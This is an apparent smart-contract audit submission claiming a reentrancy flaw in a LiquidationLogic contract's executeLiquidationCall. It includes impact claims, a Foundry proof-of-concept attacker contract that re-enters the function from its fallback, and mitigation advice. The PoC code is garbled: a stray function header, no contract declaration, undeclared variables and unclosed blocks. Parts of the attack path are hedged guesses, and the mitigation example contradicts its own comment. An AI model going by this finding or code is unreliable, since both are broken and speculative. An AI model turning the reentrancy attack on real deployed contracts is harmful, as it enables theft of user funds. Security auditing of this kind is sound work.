# Reentrancy Vulnerability in executeLiquidationCall May Cause Fund Loss

### Summary

The Reentrancy vulnerability in excuteLiquidationCall function of LiquidationLogic Contract will cause a potential loss of assets for the contract owner or users as an attacker will exploit the lack of reentrancy guards in external calls, allowing them to manipulate the contract's state and re-enter the function to drain funds.

### Root Cause
In LiquidationLogic.sol:200, the executeLiquidationCall function begins execution. Within this function, external calls, such as _burnDebtTokens and _liquidateATokens, are performed before updating the contract state. This sequence of operations leaves the contract vulnerable to reentrancy attacks, allowing a malicious actor to exploit these external calls to re-enter the function through fallback mechanisms. This re-entrancy can manipulate the contract’s state or drain funds.

Specific Reference:
The _burnDebtTokens external call is located at LiquidationLogic.sol:~293, and _liquidateATokens external call is at LiquidationLogic.sol:~301. Both are invoked before performing critical state updates, such as user configuration or reserve state adjustments, exposing the function to potential exploits

### Internal Pre-conditions

State Update Occurs After External Calls:
The vulnerable function (executeLiquidationCall) performs external calls (e.g., _burnDebtTokens or _liquidateATokens) before updating the contract state, leaving it in an inconsistent state during execution.

No Reentrancy Guard Implemented:
The function lacks a reentrancy guard (e.g., nonReentrant modifier or mutex variable), which would prevent multiple calls to the same function before completion of the initial call.

Access to Critical State or Funds:
The function interacts with critical contract funds or state variables that can be manipulated during a reentrant call.

### External Pre-conditions

Caller is a Malicious Contract:
An external malicious contract must interact with the executeLiquidationCall function and include a fallback function that performs a reentrant call.I

### Attack Path

If the contract updates the user's debt, collateral balances, or other critical state variables after external calls (instead of before), it opens the door for reentrancy. In your code, the following points are of concern:

IERC20.safeTransferFrom: External token transfers.
IAToken.handleRepayment: Likely involves external calls.
vars.collateralAToken.transferOnLiquidation: Transfers collateral, potentially to another contract

### Impact

The impact of reentrancy in the LiquidationLogic contract can be severe and lead to financial loss, insolvency of the system, and exploitation of liquidation mechanisms. Below is a breakdown of the potential impacts:

Draining Collateral
If the LiquidationLogic contract allows reentrancy, the attacker can repeatedly trigger the liquidation process for the same collateral before the system updates the state. This means:

The attacker can drain the collateral associated with the liquidated borrower multiple times.
This results in the system losing significant amounts of locked collateral, potentially causing irrecoverable financial loss.
Example Impact:
A borrower has collateral worth $100,000.
Due to reentrancy, the attacker calls executeLiquidationCall multiple times before the borrower's collateral balance is updated.
The attacker liquidates more than $100,000 worth of collateral.

 System Insolvency
Liquidation processes are critical for maintaining a system's solvency. A reentrancy exploit could:

Leave borrowers' debts unpaid while the attacker extracts the collateral.
Deplete the reserves of the lending platform, resulting in inability to cover obligations for lenders.
Cause system-wide insolvency, where the protocol can no longer function properly

### PoC

To demonstrate how an attacker can exploit the reentrancy vulnerability in the executeLiquidationCall function using Foundry, here’s a detailed Proof of Concept (PoC). This PoC will simulate how an attacker can exploit the vulnerability to repeatedly call the executeLiquidationCall function during the external contract call, which is where the reentrancy risk exists.

i will write the attacker's contract, a simple test, and how the vulnerability can be triggered

Attacker Contract (Exploiting Reentrancy)
This attacker contract will repeatedly call executeLiquidationCall in the fallback function while the liquidation function is still in progress, leading to reentrancy.

    function executeLiquidationCall(

    address public victim;

    constructor(address _liquidationContract, address _victim) {
        liquidationContract = ILiquidation(_liquidationContract);
        victim = _victim;
    }

    // The fallback function where the reentrancy attack happens
    fallback() external payable {
        // Re-enter the target contract to call executeLiquidationCall again
        liquidationContract.executeLiquidationCall(
            address(0), address(0), address(0), address(0), victim
        );
    }

    // Start the attack
    function attack() external {
        // Trigger the reentrancy attack by calling executeLiquidationCall
        liquidationContract.executeLiquidationCall(
            address(0), address(0), address(0), address(0), victim
        );
    }

contract LiquidationTest is Test {

    Attacker public attacker;
    
    address public victim = address(0x123);  // Victim user address

    // This setup assumes that the Liquidation contract is already deployed.
    function setUp() public {

        attacker = new Attacker(address(liquidationContract), victim);
    }

    // Test function to simulate the reentrancy attack
    function testReentrancyAttack() public {
        // Assume that the victim has some collateral and debt to be liquidated
        
        // Trigger the attack
        attacker.attack();
        
        // Check the state to see if the liquidation function was re-entered successfully
        // Depending on your contracts, you might want to check balances, states, or emitted events
        // For example:
        // assertEq(liquidationContract.getState(victim), expectedState);

### Mitigation

1. **Use the Checks-Effects-Interactions Pattern**: 
   - Ensure that state updates (e.g., debt balances, liquidation status) occur **before** any external calls are made. This prevents attackers from manipulating state after external calls.
   
2. **Implement Reentrancy Guards**:
   - Use a **reentrancy guard modifier** to block reentrancy during the execution of the function. This ensures that no subsequent calls can be made to the function until the current execution is completed.
   
   Example Implementation:
   ```solidity
   bool private _locked;

   modifier nonReentrant() {
       require(!_locked, "ReentrancyGuard: reentrant call");
       _locked = true;
       _;
       _locked = false;
   }

   function executeLiquidationCall(...) external nonReentrant {
       // State updates before external calls
       _burnDebtTokens(...);
       _liquidateATokens(...);
   }
   ```

3. **Review External Calls for Potential Malicious Interactions**:
   - Be cautious of external calls, especially involving token transfers, that may invoke contracts with malicious fallback functions. Ensure that the token transfer or burn logic doesn’t trigger reentrancy.


By following these recommendations, the `executeLiquidationCall` function can be secured against reentrancy vulnerabilities, ensuring that the liquidation process works as intended and without the risk of financial exploits.
